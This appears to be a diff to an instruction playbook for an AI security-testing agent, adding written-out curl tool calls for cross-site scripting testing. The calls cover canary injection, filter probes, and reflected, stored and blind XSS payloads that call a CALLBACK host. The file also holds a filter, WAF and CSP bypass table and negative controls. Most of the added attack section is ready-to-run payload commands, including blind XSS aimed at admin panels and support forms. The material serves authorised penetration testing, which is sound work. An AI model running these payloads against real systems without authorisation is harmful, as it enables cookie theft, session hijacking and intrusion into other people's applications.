@@ -36,15 +36,25 @@ Inject a benign canary (`XSSCANARY<random8>`) in the target parameter. Read the 
 
 Record context as its own observation. **Never send a payload without knowing the context.**
 
-### 2. Filter and encoding analysis
+### 2. Canary injection — context discovery
 
-Before the attack payload, probe what is filtered:
-- Send `<>"'/(){}` individually → record which are encoded, stripped, or passed.
-- Send `<script>`, `<img>`, `onerror` → record tag/event filtering.
-- Send `CANARY<br>CANARY` → check if HTML is rendered.
-- Record each probe as an observation.
+```
+cyber_process argv=["curl","-sS","-D","-","-o","canary-response.html","<url>/endpoint?q=XSSCANARY<random8>"]
+```
 
-Build the bypass map:
+Read the response and locate the canary. Record the exact context (HTML body, attribute, JS string, etc.) as its own observation.
+
+### 3. Filter and encoding probes
+
+```
+cyber_process argv=["curl","-sS","-D","-","-o","filter-chars.html","<url>/endpoint?q=%3C%3E%22%27%2F()%7B%7D"]
+cyber_process argv=["curl","-sS","-D","-","-o","filter-tag.html","<url>/endpoint?q=%3Cscript%3E"]
+cyber_process argv=["curl","-sS","-D","-","-o","filter-event.html","<url>/endpoint?q=onerror"]
+cyber_process argv=["curl","-sS","-D","-","-o","filter-html.html","<url>/endpoint?q=CANARY%3Cbr%3ECANARY"]
+```
+
+For each, check what is encoded, stripped, or passed through. Build the bypass map:
+
 | Filter | Bypass candidates |
 |---|---|
 | `<script>` blocked | `<img>`, `<svg>`, `<details/open/ontoggle>`, `<body/onload>` |
@@ -52,22 +62,62 @@ Build the bypass map:
 | `()` blocked | `` ``.constructor.constructor`alert\x281\x29` ``, `onerror=alert&lpar;1&rpar;` |
 | Case-sensitive filter | `<ScRiPt>`, `<IMG SRC=x ONERROR=…>` |
 | Double-encoding | `%253C` → `<` after server decodes twice |
-| WAF (Cloudflare/Akamai) | Chunked encoding, `\t\n` in tags, Unicode normalization, null bytes |
-| CSP `script-src` | JSONP callback on whitelisted origin, `base-uri` hijack, `object-src` |
-| Trusted Types | Policy bypass via `default` policy, `createHTML` sink |
+| WAF (Cloudflare/Akamai) | Chunked encoding, `\t\n` in tags, Unicode normalization |
+| CSP `script-src` | JSONP callback on whitelisted origin, `base-uri` hijack |
 
-### 3. Payload delivery (one per attempt)
+### 4. Payload delivery — reflected XSS
 
-For each context, craft ONE payload:
-- Reflected: inject → response → check for execution marker.
-- Stored: inject → navigate to render page → check for execution marker.
-- DOM: inject via `location.hash`/`postMessage`/`document.referrer` → check DOM sink.
-- Blind: inject → OOB callback (webhook.site, Burp Collaborator, interactsh) → wait for hit.
+For HTML body context:
 
-Execution marker = OOB callback with correlation ID, **not** visual observation alone.
 ```
-<img src=x onerror="fetch('https://CALLBACK/xss-'+btoa(document.domain))">
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3Cimg+src%3Dx+onerror%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')%3E"]
 ```
+
+For attribute context (double-quoted):
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%22+onfocus%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')+autofocus+%22"]
+```
+
+For JS string context:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3C%2Fscript%3E%3Cscript%3Efetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')%3C%2Fscript%3E"]
+```
+
+For href/src context:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=javascript:fetch('https%3A%2F%2FCALLBACK%2Fxss-UNIQUE')"]
+```
+
+Execution proof = OOB callback with correlation ID, not visual observation.
+
+### 5. Payload delivery — stored XSS
+
+Inject payload via the store endpoint (profile, comment, etc.):
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-H","Cookie: <session>","-d","{\"comment\":\"<img src=x onerror=fetch('https://CALLBACK/stored-UNIQUE')>\"}","<url>/api/comments"]
+```
+
+Then fetch the render page to trigger:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/page-with-comments"]
+```
+
+Check CALLBACK for the stored XSS hit.
+
+### 6. Payload delivery — blind XSS
+
+Inject into fields processed by another user (admin panel, support tickets):
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"name\":\"<img src=x onerror=fetch('https://CALLBACK/blind-UNIQUE')>\",\"message\":\"test\"}","<url>/api/contact"]
+```
+
+Wait for OOB callback. If received → blind XSS confirmed in the admin/processing interface.
 
 ### 4. DOM XSS specific
 
@@ -77,20 +127,46 @@ If source analysis (harness-source-deep) identified DOM sinks:
 3. If no sanitizer or bypassable: craft payload for the specific sink.
 4. `cyber_capture` the DOM state showing the injected node.
 
-### 5. Negative controls
+### 7. Negative controls
 
-For each confirmed payload:
-- Control 1: same parameter, benign value → no callback = negative control.
-- Control 2: same payload, different parameter not reflected → no callback.
-- Control 3: syntactically broken payload (e.g., `<img src=x onerr=…>`) → no callback.
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=benign-safe-text"]
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?other_param=%3Cimg+src%3Dx+onerror%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-CTRL')%3E"]
+cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?q=%3Cimg+src%3Dx+onerr%3Dfetch('https%3A%2F%2FCALLBACK%2Fxss-BROKEN')%3E"]
+```
 
-### 6. Evidence assembly
+| Control | Description | Expected |
+|---|---|---|
+| Benign value | safe text, no tags | no callback, no reflection |
+| Non-reflected param | payload on parameter that doesn't reflect | no callback |
+| Broken syntax | `onerr=` instead of `onerror=` | no callback, no execution |
+
+### 8. Evidence assembly
 
 `cyber_finding` with:
-- `evidence`: canary context observation + filter probe + payload observation + OOB callback + reproduction + all 3 negative controls
+- `evidence`: canary context observation + filter probes + payload observation + OOB callback + reproduction + all 3 negative controls
 - `sources`: the response chunk showing the unescaped payload in context
 - `checks`: context:positive-control, payload:reproduction, benign-value:negative-control, broken-syntax:negative-control, callback:contains correlation ID
 - `impact`: cookie theft feasibility (HttpOnly?), session hijack (SameSite?), stored vs reflected scope
+
+## Verification scenarios
+
+| Scenario | Observation | Expected classification |
+|---|---|---|
+| Canary reflected unescaped in HTML body | `<div>XSSCANARY</div>` in response | HTML body context confirmed |
+| Canary HTML-encoded in response | `&lt;` instead of `<` | context safe from tag injection |
+| `<img onerror=` reflected + OOB callback received | CALLBACK log with xss-UNIQUE | reflected XSS candidate |
+| `<img onerror=` reflected but no callback | payload in body, no OOB | reflection only, not execution |
+| Stored payload triggers on render page | CALLBACK log with stored-UNIQUE | stored XSS candidate |
+| Blind payload triggers from admin context | CALLBACK log with blind-UNIQUE | blind XSS candidate |
+| JS string breakout + OOB callback | `</script><script>fetch(...)` executes | JS context XSS candidate |
+| Filter strips `<script>` but passes `<img>` | `<img>` in response | filter bypass signal |
+| WAF blocks all tags | 403 or stripped body | WAF active, try encoding bypass |
+| CSP blocks inline script | no callback despite reflection | CSP effective (combine with harness-headers) |
+| Benign value → no callback | clean response | negative control confirmed |
+| Broken syntax `onerr=` → no callback | payload in body, no execution | negative control confirmed |
+
+A reflected canary is a lead. The finding is the **executed payload** with OOB confirmation or DOM capture.
 
 ### WAF bypass protocol
 
